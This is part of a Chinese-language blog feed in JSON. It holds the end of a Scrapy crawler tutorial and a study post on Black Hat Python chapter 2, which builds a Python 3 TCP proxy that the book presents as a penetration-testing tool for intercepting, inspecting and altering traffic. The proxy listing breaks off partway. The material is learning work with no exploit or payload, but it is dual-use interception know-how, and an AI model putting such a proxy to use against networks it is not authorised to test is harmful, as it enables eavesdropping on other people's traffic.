Item。(如果不了解 ORM, 不用担心，您会发现这个步骤非常简单)<br />\n 首先根据需要从 dmoz.org 获取到的数据对 item 进行建模。我们需要从 dmoz 中获取名字，url，以及网站的描述。对此，在 item 中定义相应的字段。编辑 tutorial 目录中的 items.py 文件。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>items<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>DmozItem<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    title<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    link<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    desc<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>代码一开始这看起来可能有点复杂，但是通过定义 item，您可以很方便的使用 Scrapy 的其他方法。而这些方法需要知道您的 item 的定义。</p>\n</font>\n<h2 id=\"spider爬虫\"><a class=\"anchor\" href=\"#spider爬虫\">#</a> Spider 爬虫</h2>\n<font color=\"BlueViolet\">\n<p>Spider 是用户编写用于从单个网站 (或者一些网站) 爬取数据的类。<br />\n其包含了一个用于下载的初始 URL，如何跟进网页中的链接以及如何分析页面中的内容，提取生成 item 的方法。</p>\n<p>为了创建一个 Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性:</p>\n<ul>\n<li>name: 用于区别 Spider。该名字必须是唯一的，您不可以为不同的 Spider 设定相同的名字。</li>\n<li>start_urls: 包含了 Spider 在启动时进行爬取的 url 列表。因此，第一个被获取到的页面将是其中之一。后续的 URL 则从初始的 URL 获取到的数据中提取。</li>\n<li>parse () 是 spider 的一个方法。被调用时，每个初始 URL 完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。该方法负责解析返回的数据 (response data)，提取数据 (生成 item) 以及生成需要进一步处理的 URL 的 Request 对象。</li>\n</ul>\n<p>也可以使用命令行创建一个 Spider。比如要生成 Quotes 这个 Spider，可以执行如下命令：<br />\n <code>cd 项目目录</code> <br />\n <code>scrapy genspider quotes quotes.toscrape.com</code> <br />\n 语法格式<br />\n <code>scrapy genspider [options] &lt;name&gt; &lt;domain&gt;</code></p>\n<p>以下为我们的第一个 Spider 代码，保存在 tutorial/spiders 目录下的 dmoz_spider.py 文件中，如 Code 3-21 所示:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>DmozSpider<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Spider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    name <span class=\"token operator\">=</span> <span class=\"token string\">'dmoz'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    allowed_domains <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'dmoz.org'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    start_urls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Books'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Resources'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    filename<span class=\"token operator\">=</span>response<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></font>\n<h2 id=\"爬虫爬取\"><a class=\"anchor\" href=\"#爬虫爬取\">#</a> 爬虫爬取</h2>\n<font color=\"BlueViolet\">\n<p>进入项目的根目录，执行下列命令启动 spider: <code>scrapy crawl homeweather</code></p>\n</font>\n<h2 id=\"紧急\"><a class=\"anchor\" href=\"#紧急\">#</a> 紧急</h2>\n<p>学校要提前放假，考试也提前了。。<br />\n抓紧时间备考了</p>\n<p>考试后再总结</p>\n",
            "tags": [
                "scrapy"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BA%8C-%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BATCP%E4%BB%A3%E7%90%86/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BA%8C-%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BATCP%E4%BB%A3%E7%90%86/",
            "title": "BHP第二章(二)——创建TCP代理",
            "date_published": "2020-12-25T01:12:58.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>总算有时间了，赶紧学一会。</p>\n<h1 id=\"为什么要创建一个tcp代理\"><a class=\"anchor\" href=\"#为什么要创建一个tcp代理\">#</a> 为什么要创建一个 TCP 代理</h1>\n<p>书中原话：</p>\n<blockquote>\n<p>有很多理由让你的工具箱里，保留一个 TCP 代理，<font color=\"green\">它不仅可以将流量从一个主机转发给另一个主机，而且可以评估基于网络的软件。在企业级环境下进行渗透测试时，你会经常遇到无法使用 Wireshark 的情况，无法在 windows 系统上加载驱动嗅探本地网络流量，分段的网络也阻止使用工具直接嗅探目标主机。我经常在实际案例中部署简单的 TCP 代理以了解未知的协议，修改发送到应用的数据包，或者为模糊测试创建一个测试环境。</font></p>\n</blockquote>\n<h1 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h1>\n<p>首先要搞清楚原理，网上搜索的时候看到了一篇介绍：《简单聊聊网络代理原理》<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjI3MTkzMQ==\">https://zhuanlan.zhihu.com/p/56271931</span></p>\n<p>Python 实现 TCP 代理的原理</p>\n<ol>\n<li>【需要代理方】向代理服务器发出请求信息。</li>\n<li>【代理服务器】应答。</li>\n<li>【需要代理方】接到应答后发送向【代理服务器】发送【目的】ip 和端口。</li>\n<li>【代理服务器】与目的连接。</li>\n<li>【代理服务器】将【需要代理方】发出的信息传到【目的方】，将目的方发出的信息传到【需要代理方】。</li>\n<li>代理完成。</li>\n</ol>\n<p>画了个图：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"基于python3实现的tcp代理\"><a class=\"anchor\" href=\"#基于python3实现的tcp代理\">#</a> 基于 Python3 实现的 TCP 代理</h1>\n<blockquote>\n<p>书上是 2.x 版本的，想要改成 3.x 版本的。网上一搜，前辈们已经在几年前就替我们实现了。把代码改变了一下</p>\n</blockquote>\n<p><font color='red'>我已经把所有代码都写上了注释。</font></p>\n<p>解释一下【receive_first】参数：<br />\n这个参数如果是 True，程序会先接受远程目标主机发送的数据，因为有些服务进程可能会做这样的事情，例如 ftp 服务器一般会首先发送旗标。</p>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#说明：这里涉及到三方：本地主机、远程主机和服务器。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#该段代码是运行在 Linux 服务器上的，为本地主机提供代理以便与远程主机通信。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> logging</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> ctypes</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>logging<span class=\"token punctuation\">.</span>basicConfig<span class=\"token punctuation\">(</span>level<span class=\"token operator\">=</span>logging<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                    <span class=\"token comment\"># 格式化输出</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    <span class=\"token builtin\">format</span><span class=\"token operator\">=</span><span class=\"token string\">'%(asctime)s - %(levelname)s : %(message)s'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token comment\"># 日志信息输出到文件中</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token comment\">#filename=\"./TCP_proxy.log\", filemode=\"a\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>logging 为调试部分。不想显示调试信息可以把logging.basicConfig的level改成更高的等级，或者注释logging语句。</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hex_dump</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    显示数据包的十六进制，并显示对应的ASCII码。</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    digits <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        s <span class=\"token operator\">=</span> src<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> length<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        hexa <span class=\"token operator\">=</span> <span class=\"token string\">' '</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"%0*X\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t\\thexa:%s\"</span> <span class=\"token operator\">%</span> hexa<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        text <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&lt;=</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x7F</span> <span class=\"token keyword\">else</span> <span class=\"token string\">'.'</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t\\ttext:%s\"</span> <span class=\"token operator\">%</span> text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\"%04X   %-*s   %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> length <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>digits <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hexa<span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">receive_from</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    接收本地或远程主机的数据</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># 接收数据需要在 2s 内处理完成，否者抛出超时异常。  这个时间有些短，后续测试的时候输入 FTP 账号、密码的时间有些紧。。。</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\"># 可调长一些，但其实应该用更科学的办法来处理。。。  还是那句话，后面的路还很远，先略过。。。</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    connection<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token comment\"># 一直读入缓冲区，直到没有更多的数据</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token comment\"># 我们给它设置超时报错</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            data <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token comment\"># 显示函数没有接收到数据</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"def receive_from no data return\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"receive data:%s\\n\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token builtin\">buffer</span> <span class=\"token operator\">+=</span> data</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># 显示该函数的报错信息</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">'def receive_from error:%s'</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">request_handler</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    可以在该函数中修改传送到目标主机的数据（请求数据）。</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    功能未完待续</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    执行包修改</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">response_handler</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    可以在该函数中修改目标主机返回到本地主机的数据（响应数据）</pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    功能未完待续</pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    执行包修改</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">buffer</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proxy_handler</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    在线程中处理代理任务</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    代理服务器与目标绑定套接字</pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token comment\"># 打印该线程 ID，语句只能在 Linux 下执行</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    threading_id <span class=\"token operator\">=</span> ctypes<span class=\"token punctuation\">.</span>CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>syscall<span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token comment\"># 请求与目标主机的连接。</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    remote_socket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    remote_socket<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    <span class=\"token comment\"># 如有必要先从目标接受数据，如 FTP 服务器会先发送旗标等等</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token keyword\">if</span> receive_first<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token comment\"># 接收远程主机的数据</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>remote_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token comment\"># 在日志中打印出原始数据</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"threading id: %s remote_buffer:%s\\n\"</span> <span class=\"token operator\">%</span> threading_id<span class=\"token punctuation\">,</span> remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token comment\"># 调用十六进制转储函数</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        hex_dump<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token comment\"># 将它发送到我们的响应处理器</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token comment\"># 响应函数什么都没写，数据还是原样返回</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> response_handler<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token comment\"># 如果从目标接受到了数据，就发送到我们的本地客户端</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Sending %d bytes to localhost.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token comment\"># 现在我们循环读取数据，发送给远程主机和本地客户端</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token comment\"># 接收本地主机的数据</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        local_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        <span class=\"token comment\"># 如果有数据就打印</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Received %d bytes from localhost.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>            hex_dump<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>            <span class=\"token comment\"># 将它发送到我们的请求处理程序</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>            <span class=\"token comment\"># 请求处理函数什么都没写，数据还是原样返回</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>            local_buffer <span class=\"token operator\">=</span> request_handler<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>            <span class=\"token comment\"># 将数据发送到目标主机</span></pre></td></tr><tr><td 